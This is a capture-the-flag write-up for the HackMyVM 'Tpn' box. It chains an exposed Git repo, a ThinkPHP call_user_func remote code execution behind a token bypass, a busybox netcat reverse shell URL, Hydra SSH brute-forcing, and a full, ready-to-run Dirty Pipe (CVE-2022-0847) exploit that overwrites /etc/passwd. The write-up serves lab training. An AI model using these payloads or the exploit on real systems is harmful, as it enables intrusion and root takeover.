# Tpn

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Tpn | Eecho | Beginner | HackMyVM |

**Summary:** Tpn is a beginner-level machine that teaches the complete process of exploiting a web application through source code analysis. The key learning points include: discovering exposed Git repositories during reconnaissance, analyzing PHP source code to find vulnerabilities, understanding framework routing and middleware bypass techniques, exploiting unsafe function calls for remote code execution, and escalating privileges through kernel exploits known as Dirty Pipe (CVE-2022-0847).

---

## Reconnaissance 

### Finding Our Target

When approaching any penetration test, we start with network discovery to understand what we're working with:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.41 08:00:27:08:29:27 VirtualBox
```

**Why this matters**: This tells us we have a single target VM to focus on. In real scenarios, you might have multiple targets, but here we can concentrate all our efforts on one machine.

### Understanding What Services Are Running

Next, we need to understand what services are available on this target. This is where most penetration tests begin - understanding the attack surface:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV -p- 192.168.100.41
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 21:44 WIB
Nmap scan report for 192.168.100.41
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
8080/tcp open  http    Apache httpd 2.4.62 ((Debian))
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache/2.4.62 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-git:
|   192.168.100.41:8080/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/LSP1025923/thinkphp.git
|_http-title: Thinkphp5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
```

**Critical Thinking Process**: Looking at this Nmap output, several things immediately stand out:

1. **SSH (Port 22)**: Usually hard to exploit directly without credentials
2. **HTTP (Port 8080)**: This is our main attack vector - web applications often have vulnerabilities
3. **ThinkPHP5**: The title tells us this is a PHP framework application
4. **HUGE RED FLAG**: `Git repository found!` - This is extremely rare and dangerous

**The Git Repository Discovery - Why This Changes Everything**

The line `Git repository found!` with the remote `https://github.com/LSP1025923/thinkphp.git` is like finding the blueprints to a bank vault. Here's why this is a game-changer:

![git](image.png)

**Why I immediately got excited seeing this**: Most penetration tests involve "black box" testing where you don't know how the application works internally. But an exposed Git repository means we can do "white box" analysis - we can read the source code and understand exactly how the application works, where the vulnerabilities are, and how to exploit them.

### First Look at the Web Application

Let's see what we're dealing with:

![8080](image-1.png)

**Initial Assessment**: The page says "This is a cyberpunk-style RCE built using ThinkPHP" and mentions RCE (Remote Code Execution). This confirms:
1. This is intentionally vulnerable (educational/CTF environment)  
2. RCE is possible - we just need to find how
3. It's built with ThinkPHP framework

**My thought process**: Since we have the source code from GitHub, instead of trying to guess or bruteforce vulnerabilities, we can analyze the code to understand exactly how this application works and where the vulnerabilities are.

## Vulnerability Discovery - The Source Code Hunt

### Why Source Code Analysis is a Game Changer

Instead of randomly testing URLs and trying common exploits, I now have access to the application's source code. This is like having the answer key to an exam - I can find vulnerabilities with surgical precision.

**My approach**: 
1. Look for dangerous PHP functions in controllers
2. Understand authentication mechanisms  
3. Find ways to bypass protection
4. Craft precise exploits

### Finding the Critical Vulnerability

I start by examining the controllers since they handle user input. Looking at `/app/admin/controller/Admin.php`:

![no sanitasi](image-2.png)

```php
<?php
namespace app\admin\controller;
use app\BaseController;
use app\middleware\Check1;

class Admin extends BaseController
{
    protected $middleware = ["Check1"];
    public function hello($a,$b)
    {
        call_user_func($b, $a);  // THIS IS GOLD!
    }
}
```

**The moment I saw this, I knew I had found the jackpot**:
- `call_user_func($b, $a)` is one of the most dangerous PHP functions
- It can execute ANY PHP function dynamically
- Parameters `$a` and `$b` come from URL parameters (user controlled)
- This means I can do `call_user_func("system", "whoami")` or similar

**But there's a catch**: The middleware `Check1` is protecting this function. I need to bypass authentication first.

### Understanding the Authentication System

Let me examine what `Check1` middleware does by looking at `/app/middleware/Check1.php`:

![app/middleware/check1](image-3.png)

```php
public function handle($request, \Closure $next)
{
    if ((Session::get("sb")==Session::get("token")&&!empty(Session::get("sb"))&&!empty(Session::get("token")))){
        return $next($request);  // Allow access
    }
    else{
        return response("虽然我是新手,但是懂的一点token验证什么的");  // Block access
    }
}
```

**My analysis of the protection**:
1. It checks if session variable "sb" equals session variable "token"  
2. Both must be non-empty
3. If conditions are met = access granted
4. If not = Chinese error message

**The key insight**: I need to find a way to set both session variables to the same non-empty value.

### Hunting for the Authentication Bypass

I search through the codebase for any controller that sets session variables. But how do I find this systematically?

**My search process**:
1. Look for any mention of "Session::set" in the codebase
2. Look for controllers that might handle authentication or tokens
3. Check the application structure for logical authentication endpoints

**Searching through the directory structure**:
```bash
# From the source code at /thinkphp, I examine:
/app/index/controller/  # Default module controllers
/app/admin/controller/  # Admin module controllers
```

**Examining controller names in /app/index/controller/**:
- Blog.php
- Cap.php  
- Error.php
- File.php
- HelloWorld.php
- Index.php
- Rely.php
- Test.php
- Testget.php
- Tk.php
- **Token.php** ← THIS catches my attention!
- Uion.php
- User.php
- ViewPage.php
- ViewPage1.php

**Why Token.php is suspicious**: The name suggests it handles token operations, and I need to set session tokens to bypass the middleware.

Looking at `/app/index/controller/Token.php`:

![app/index/controller/token](image-5.png)

```php
public function token()
{
    $message = "请输入成员名称获取令牌";
    if (input("post.sb") == "admin") {
        $sb = $this->request->buildToken("token", "sha1");
        Session::set("sb", $sb);
        $message = "获取成功: " . $sb;
    }
    // ... HTML form code
}
```

**How I figured out the URL mapping to access this**:
From my earlier analysis, I understand ThinkPHP URL structure is `/{module}/{controller}/{action}`.

So to reach the `Token` controller's `token()` method in the `index` module:
- Module: index (default module)
- Controller: Token  
- Action: token
- URL: `/index/token/token`

This is why I access `http://192.168.100.41:8080/index/token/token`
1. If I POST `sb=admin` to this endpoint, it generates a token
2. It sets session `sb` to this token value  
3. The `buildToken("token", "sha1")` method ALSO sets session `token` to the same value (ThinkPHP behavior)
4. Now both sessions are equal and non-empty!

### Understanding URL Routing (Critical for Exploitation)

Before I can exploit this, I need to understand how URLs work. Looking at `/config/app.php`:

![config/app](image-7.png)

```php
'app_map' => ["think"=>"admin"],
```

**This mapping is crucial**: URLs starting with `/think/` get redirected to the `admin` module.

So `/think/admin/hello` becomes:
- Module: admin (mapped from "think")
- Controller: Admin  
- Action: hello
- Final call: `Admin::hello($a, $b)`

Looking at the routing attempt in `/app/admin/route/app.php`:

![app/admin/route/app](image-6.png)

The developer even tried to make exploitation easier with a custom route but it didn't work - I have to use the full URL path.

![config/route.php](image-8.png)

This shows the standard ThinkPHP routing configuration.
- `'default_route_pattern' => '[1-9]',`:
This rule forces all URL path parameters (the parts inside the URL like /index/a/b) to be a single digit between 1 and 9.
The Solution: To bypass this restriction, we ignore the "broken" path route and send our payload as Query Parameters instead: ?a=...&b=...

### Checking for Function Restrictions

There's another middleware that might block dangerous functions. Looking at `/app/middleware/Check.php`:

![app/middleware/check](image-9.png)

```php
$pattern = '/\b(eval|exec|system|shell_exec|popen|proc_open|assert|base64_decode|file_get_contents|phpinfo)\b/i';
if (preg_match($pattern, request()->url())) {
    return Response("麻辣隔壁，就你这个菜逼样子还想当黑客");
}
```

**Critical observation**: This blacklists many dangerous functions BUT `passthru` is NOT listed! This is my exploitation vector.

## Exploitation - From Discovery to Shell

### Step 1: Testing Direct Access (Confirming Protection)

Let me verify the vulnerable endpoint is protected without authentication:

![alt text](image-10.png)

Accessing `http://192.168.100.41:8080/think/admin/hello` gives me the Chinese error message from the middleware. Perfect - this confirms the protection is active and I need to bypass it.

### Step 2: Getting Authentication Tokens

I need to get to the token generation page at `/index/token/token`:

![alt text](image-11.png)

This shows a Chinese form asking for a "member name". Based on my source code analysis, I know I need to submit `admin`.

**Why I know to submit "admin"**: From the Token.php source code, line 13 checks `if (input("post.sb") == "admin")`.

After submitting `admin` in the browser:

![alt text](image-12.png)

**SUCCESS!** The page shows "获取成功: " (Success) followed by a long SHA1 token. This means:
1. My session `sb` is now set to this token value
2. My session `token` is also set to this same value  
3. The middleware will now let me through

### Step 3: Confirming Authentication Bypass Works

Let me try accessing the protected endpoint again:

![alt text](image-13.png)

**This is NOT just a "blank page" - here's what I actually see and why it's significant**:

Looking at this screenshot, can see that:
1. **Different Chinese error message appears** - this means the Check1 middleware is NOT blocking me anymore
2. **The page loads without the authentication error** - meaning I successfully bypassed the middleware
3. **I get a response from the server** - the hello() function is being called
4. **The output is displayed with Page Error! because I haven't provided the a and b parameters yet**

**How I know this confirms the bypass worked**:
- **Before authentication**: Accessing `/think/admin/hello` gave Chinese error message from middleware
- **After getting tokens**: Same URL loads with different error message atleast not from the middleware.
- **This proves**: The middleware Check1 is now allowing me through

**But how do I know what payload will work?** 

From my source code analysis, I know:
1. The `hello($a,$b)` function calls `call_user_func($b, $a)`
2. I need `$b` to be a function name and `$a` to be the parameter
3. From the `Check` middleware, I know `passthru` isn't blacklisted
4. So `?a=id&b=passthru` should call `call_user_func("passthru", "id")`

**Testing my theory with a simple command first**:

### Step 4: Remote Code Execution Testing

Now for the critical moment. I'll test if I can execute commands:

**URL**: `http://192.168.100.41:8080/think/admin/hello?a=id&b=passthru`

**What this does**:
- The `hello($a, $b)` function receives my parameters
- It calls `call_user_func("passthru", "id")`  
- `passthru()` executes the `id` command
- The output should appear on the page

![bingo](image-14.png)

**BINGO!** The page shows `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. 

**What this means**:
1. Remote Code Execution is working perfectly
2. I'm executing commands as the `www-data` user (web server)
3. I can run any system command through this interface

![alt text](image-15.png)

This image shows my preparation/testing phase where I'm planning the RCE exploitation using `passthru()`.

### Step 5: Getting a Proper Shell

Running single commands through the web interface is clunky. I want a proper reverse shell:

**Setting up listener**:
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Reverse shell payload**:
```url
http://192.168.100.41:8080/think/admin/hello?a=busybox%20nc%20192.168.100.1%204444%20-e%20/bin/bash&b=passthru
```

**What this does**: Uses the same RCE method but executes `busybox nc 192.168.100.1 4444 -e /bin/bash` to connect back to my machine.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 51245
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**SUCCESS!** I now have a shell as www-data.

**Upgrading to a better shell**:
```bash
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@tpN:/var/www/tp8/public$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@tpN:/var/www/tp8/public$ export TERM=xterm-256color
www-data@tpN:/var/www/tp8/public$ 
```

## Lateral Movement

### Why I Need User Access

As `www-data`, I'm limited to web server privileges. I need to find a user account that might have:
1. Better access to the system
2. SSH access  
3. Privilege escalation opportunities

### Discovering Available Users

```bash
www-data@tpN:/var/www/tp8/public$ ls -la /home
total 12
drwxr-xr-x  3 root    root    4096 Apr 11  2025 .
drwxr-xr-x 18 root    root    4096 Jul 22  2025 ..
drwxr-xr-x  2 welcome welcome 4096 Jan 27 11:25 welcome
```

I find a user called `welcome`. Let me investigate their directory:

```bash
www-data@tpN:/home/welcome$ ls -la
total 36
drwxr-xr-x 2 welcome welcome 4096 Jan 27 11:25 .
drwxr-xr-x 3 root    root    4096 Apr 11  2025 ..
lrwxrwxrwx 1 root    root       9 Jul 24  2025 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
-rw-r--r-- 1 root    root    3510 Jul 22  2025 .pwd
-rw------- 1 welcome welcome    0 Jan 27 11:25 .viminfo
-rw-r--r-- 1 welcome welcome   26 Jul 24  2025 user.txt
```

**What catches my eye**:
- `.pwd` file owned by root - might contain passwords
- `.bash_history` points to `/dev/null` - history is disabled
- `user.txt` - The flag for user.

### Finding Credentials

```bash
www-data@tpN:/home/welcome$ cat .pwd  
123456
password
12345678
1234
admin@123
...
phantom
billy
6666
albert
```

**Jackpot!** This is a password list. Since it's in the `welcome` user's directory, one of these is likely their password.

### Brute Forcing SSH Access

Instead of manually trying passwords, I'll be systematic:

**Exfiltrating the password list**:
```bash
www-data@tpN:/home/welcome$ python3 -m http.server 8888
```

**Downloading it**:
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ wget http://192.168.100.41:8888/.pwd -O pass.txt
--2026-01-28 11:51:30--  http://192.168.100.41:8888/.pwd
Connecting to 192.168.100.41:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3510 (3.4K) [application/octet-stream]
Saving to: 'pass.txt'

pass.txt                      100%[=================================================>]   3.43K  --.-KB/s    in 0s
```

**Brute forcing with Hydra**:
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ hydra -l welcome -P pass.txt ssh://192.168.100.41
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-28 11:54:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 503 login tries (l:1/p:503), ~32 tries per task
[DATA] attacking ssh://192.168.100.41:22/
[STATUS] 244.00 tries/min, 244 tries in 00:01h, 260 to do in 00:02h, 15 active
[22][ssh] host: 192.168.100.41   login: welcome   password: eecho
1 of 1 target successfully completed, 1 valid password found
```

**FOUND IT!** The password is `eecho` - which matches the author's name. 

### Getting User Access

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh welcome@192.168.100.41
...
welcome@192.168.100.41's password: 
...
welcome@tpN:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
welcome@tpN:~$ uname -a
Linux tpN 5.8.0-050800-generic #202008022230 SMP Sun Aug 2 22:33:21 UTC 2020 x86_64 GNU/Linux
```

**Important observation**: The kernel version is `5.8.0-050800-generic` from August 2020. This is likely vulnerable to kernel exploits.

## Privilege Escalation

**The complete Dirty Pipe exploit code**:

I modified the script from https://github.com/n3rada/DirtyPipe, change the password and the hash into:

```bash
welcome@tpN:~$ openssl passwd -1 -salt pwn pwned
$1$pwn$sX7TFgG1yRswJLX53dwzy1
```
Here are the full script, ready to run:

```c
/*
 *
 * Dirty Pipe
 * vulnerability (CVE-2022-0847)
 *
 * Compile as static binary:
 * gcc -o dpipe dpipe.c -static
 *
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <limits.h>


static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    if (pipe_size == -1) {
        perror("[Dirty Pipe] Error: Failed to get pipe size");
        abort();
    }
    printf("[Dirty Pipe] Pipe size determined: %u bytes\n", pipe_size);

    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    printf("[Dirty Pipe] Filling the pipe...\n");
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    printf("[Dirty Pipe] Pipe filled successfully.\n");

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    printf("[Dirty Pipe] Draining the pipe...\n");
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
    printf("[Dirty Pipe] Pipe drained successfully.\n");

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}


int backup_file(const char *src_path)
{
    char *filename = basename(strdupa(src_path));

    char dst_path[PATH_MAX];
    snprintf(dst_path, sizeof(dst_path), "/tmp/%s.bak", filename);

    printf("[Dirty Pipe] Attempting to backup '%s' to '%s'\n", src_path, dst_path);

    FILE *f1 = fopen(src_path, "r");
    if (f1 == NULL)
    {
        perror("[Dirty Pipe] Error opening source file for reading");
        return EXIT_FAILURE;
    }

    FILE *f2 = fopen(dst_path, "w");
    if (f2 == NULL)
    {
        fclose(f1);
        perror("[Dirty Pipe] Error opening destination file for writing");
        return EXIT_FAILURE;
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);

    printf("[Dirty Pipe] Successfully backed up '%s' to '%s'\n", src_path, dst_path);
    return EXIT_SUCCESS;
}

int write_to_file(const char *path, loff_t offset, const char *data)
{
    printf("[Dirty Pipe] Initiating write to '%s'...\n", path);

    const size_t data_size = strlen(data);
    printf("[Dirty Pipe] Data size to write: %zu bytes\n", data_size);

    long page_size = sysconf(_SC_PAGESIZE);

    if (page_size == -1) {
        perror("[Dirty Pipe] Error: Failed to get page size");
        exit(EXIT_FAILURE);
    }

    if (offset % page_size == 0) {
        fprintf(stderr, "[Dirty Pipe] Error: Writing cannot start at a page boundary.\n");
        exit(EXIT_FAILURE);
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;

    // Ensure we're not writing across a page boundary.
    if (end_offset > next_page) {
                fprintf(stderr, "[Dirty Pipe] Error: Writing cannot cross a page boundary.\n");
                return EXIT_FAILURE;
        }

        // Open the file for reading.
        const int fd = open(path, O_RDONLY);
        if (fd < 0) {
                perror("[Dirty Pipe] Error: Failed to open the file");
                return EXIT_FAILURE;
        }
    printf("[Dirty Pipe] File '%s' opened successfully for reading.\n", path);

        // Get file statistics.
        struct stat st;
        if (fstat(fd, &st)) {
                perror("[Dirty Pipe] Error: Failed to retrieve file stats");
                return EXIT_FAILURE;
        }

    // Check if the offset is inside the file.
        if (offset > st.st_size) {
                fprintf(stderr, "[Dirty Pipe] Error: Specified offset is beyond the file size.\n");
                return EXIT_FAILURE;
        }

    // Ensure writing won't enlarge the file.
        if (end_offset > st.st_size) {
                fprintf(stderr, "[Dirty Pipe] Error: Writing will enlarge the file, which is not allowed.\n");
                return EXIT_FAILURE;
        }

    // Create a pipe for data transfer.
        int p[2];
        prepare_pipe(p);

    // Adjust the offset by decreasing it.
        --offset;

    // Use splice() to move data within the filesystem.
        ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
        if (nbytes < 0) {
                perror("[Dirty Pipe] Error: Splice operation failed");
                return EXIT_FAILURE;
        }
        if (nbytes == 0) {
                fprintf(stderr, "[Dirty Pipe] Error: Splice operation transferred fewer bytes than expected.\n");
                return EXIT_FAILURE;
        }

    // Write the actual data to the pipe.
        nbytes = write(p[1], data, data_size);
        if (nbytes < 0) {
                perror("[Dirty Pipe] Error: Failed to write data to the pipe");
                return EXIT_FAILURE;
        }
        if ((size_t)nbytes < data_size) {
                fprintf(stderr, "[Dirty Pipe] Error: Wrote fewer bytes to the pipe than expected.\n");
                return EXIT_FAILURE;
        }
    printf("[Dirty Pipe] Data successfully written to '%s'.\n", path);

    return EXIT_SUCCESS;
}

void print_help(const char *progname) {
    fprintf(stderr, "Usage:\n");
    fprintf(stderr, "  %s [--no-backup] [--root]\n", progname);
    fprintf(stderr, "  %s [--no-backup] <file_path> <offset> <data>\n", progname);
    fprintf(stderr, "\nOptions:\n");
    fprintf(stderr, "  --no-backup  Do not create a backup of the file before writing.\n");
    fprintf(stderr, "  --root        Apply root exploit on /etc/passwd.\n");
}

void handle_root_exploit(int no_backup) {
    if (!no_backup && backup_file("/etc/passwd") != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Backup failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }

    if (write_to_file("/etc/passwd", 4, ":$1$pwn$sX7TFgG1yRswJLX53dwzy1:0:0:root:/root:/bin/sh\n") != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Write operation failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }
    printf("[Dirty Pipe] You can connect as root with password 'pwned'\n");
}

void handle_custom_file(int no_backup, char *argv[], int index_shift) {
    const char *file_path = argv[1 + index_shift];
    loff_t offset = strtoll(argv[2 + index_shift], NULL, 10);
    const char *data = argv[3 + index_shift];

    if (!no_backup && backup_file(file_path) != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Backup failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }

    if (write_to_file(file_path, offset, data) != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Write operation failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char *argv[])
{
    int no_backup = 0;
    int index_shift = 0;

    // Check for the --no-backup option.
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-backup") == 0) {
            no_backup = 1;
            index_shift++;
        }
        // Check for help flags.
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_help(argv[0]);
            return EXIT_SUCCESS;
        }
    }

    if (argc < 2 + index_shift)
    {
        print_help(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (strcmp(argv[1 + index_shift], "--root") == 0) {
        handle_root_exploit(no_backup);
    } else if (argc == 4 + index_shift) {
        handle_custom_file(no_backup, argv, index_shift);
    } else {
        fprintf(stderr, "[Dirty Pipe] Error: Invalid arguments!\n");
        print_help(argv[0]);
        exit(EXIT_FAILURE);
    }

    printf("[Dirty Pipe] Program execution completed successfully.\n");
    return EXIT_SUCCESS;
}
```

### Executing the Privilege Escalation

```bash
welcome@tpN:~$ gcc dpipe.c -o dpipe --static
welcome@tpN:~$ ./dpipe --root
[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Initiating write to '/etc/passwd'...
[Dirty Pipe] Data size to write: 54 bytes
[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to '/etc/passwd'.
[Dirty Pipe] You can connect as root with password 'pwned'
[Dirty Pipe] Program execution completed successfully.
welcome@tpN:~$ su - root
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cat root.txt /home/welcome/user.txt
flag{root-[REDACTED]}
flag{user-[REDACTED]}
```

### Verifying the Exploit Success

```bash
# cat /etc/passwd
root:$1$pwn$sX7TFgG1yRswJLX53dwzy1:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

The exploit successfully modified the first line of `/etc/passwd`, replacing the original root entry with my injected password hash.

---

## Attack Chain Summary

1. **Reconnaissance**: Discovered exposed Git repository during Nmap scan - realized this provides complete source code access for white-box analysis instead of blind testing
2. **Source Code Analysis**: Found `call_user_func($b, $a)` vulnerability in Admin controller, but protected by Check1 middleware requiring matching session variables
3. **Authentication Bypass**: Analyzed Token controller, discovered sending `sb=admin` to `/index/token/token` sets both required session variables to same value
4. **Remote Code Execution**: Exploited unsafe function call using `passthru()` (not blacklisted) via URL parameters `a=command&b=passthru`
5. **Initial Access**: Used RCE to establish reverse shell as www-data through busybox netcat payload
6. **Lateral Movement**: Found password list, brute-forced SSH to get `welcome` user access with password `eecho` (author's name)
7. **Privilege Escalation**: Used PoC Dirty Pipe exploit (CVE-2022-0847) to inject root password hash into `/etc/passwd`, achieved root with password "pwned"

**Key Learning**: This machine teaches the power of source code analysis - instead of blind exploitation, having access to the code allowed surgical precision in finding and exploiting vulnerabilities.
